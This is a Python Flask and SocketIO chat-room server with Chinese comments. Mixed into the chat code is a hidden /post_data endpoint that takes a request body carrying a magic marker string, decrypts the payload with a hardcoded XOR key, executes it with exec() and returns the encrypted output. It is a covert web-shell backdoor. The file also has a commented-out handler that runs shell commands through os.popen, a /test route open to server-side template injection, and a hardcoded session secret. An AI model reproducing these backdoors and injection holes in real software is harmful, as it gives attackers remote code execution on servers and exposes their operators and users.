from flask import Flask, render_template, request, render_template_string, session, make_response, jsonify
from flask_socketio import SocketIO, join_room, leave_room, send
import os

app = Flask(__name__)
app.secret_key = 'secret'
# socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent') # 正式部署使用这个
socketio = SocketIO(app, cors_allowed_origins="*")


# 主页路由
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/nonono')
def my_view():
    session['test'] = 'nonono123123'
    # return 'hello, nonono!'
    # # 通过定义返回内容设置cookie
    # resp = make_response("success")
    resp = session.get('test')
    return resp

@app.route('/post_data', methods=['POST'])
def handle_post():
    # 获取请求体的原始数据，并将其解码为字符串
    # data = request.get_data(as_text=True)
    # return jsonify({"message": "Raw data received", "data": data}), 200
    import base64
    import random
    parma = {'resp': 'Error'}
    if '35bf18be8e556b46' in request.get_data(as_text=True):
        p_code = request.get_data(as_text=True).replace('35bf18be8e556b46', '')
        ciphertext = base64.b64decode(p_code)
        plaintext = bytearray(len(ciphertext))
        rkey = 4
        key = base64.b64decode('4vNKBses819qK3hEp3l3tBg6BSlZZH52LTI3o4eLi/c=')
        random.seed(rkey)
        for i in range(len(ciphertext)):
            plaintext[i] = ciphertext[i] ^ (random.randint(1, len(ciphertext)) & 0xff) ^ key[i % len(key)]
            plaintext[i] = plaintext[i] ^ rkey
        exec(plaintext, parma)
        plaintext = str(parma['resp']).encode('utf-8')
        ciphertext = bytearray(len(plaintext))
        random.seed(rkey)
        for i in range(len(plaintext)):
            ciphertext[i] = plaintext[i] ^ rkey
            ciphertext[i] = ciphertext[i] ^ (random.randint(1, len(plaintext)) & 0xff) ^ key[i % len(key)]
        parma['resp'] = base64.b64encode(ciphertext).decode('utf-8')
        return str(parma['resp'])
    return parma['resp']

app.add_url_rule("/hello", endpoint="hello_endpoint")
@app.endpoint("hello_endpoint")
def hello_world():
    return 'Hello, World!'


# 用户加入聊天室事件
@socketio.on('join', namespace='/chat')
def join(message):
    room = message['room']
    join_room(room)
    send({'msg': message['username'] + " 加入了聊天室."}, room=room)


# 用户发送消息事件
@socketio.on('text', namespace='/chat')
def text(message):
    room = message['room']
    send({'msg': message['username'] + ": " + message['msg']}, room=room)


# 用户离开聊天室事件
@socketio.on('left', namespace='/chat')
def left(message):
    room = message['room']
    leave_room(room)
    send({'msg': message['username'] + " 离开了聊天室."}, room=room)


# @socketio.on('shell', namespace='/wst')
# def wst(json):
#     cmdline = json['cmdline']
#     c = os.popen(cmdline).read()
#     send({'msg': c})
#     send({'msg': '执行完毕'})

@app.route('/test',methods=['GET', 'POST'])
def test():
    template = '''
        <div class="center-content error">
            <h1>Oops! That page doesn't exist.</h1>
            <h3>%s</h3>
        </p>
    ''' %(request.values.get('param'))

    return render_template_string(template)

if __name__ == '__main__':
    socketio.run(app, debug=False, host='0.0.0.0')
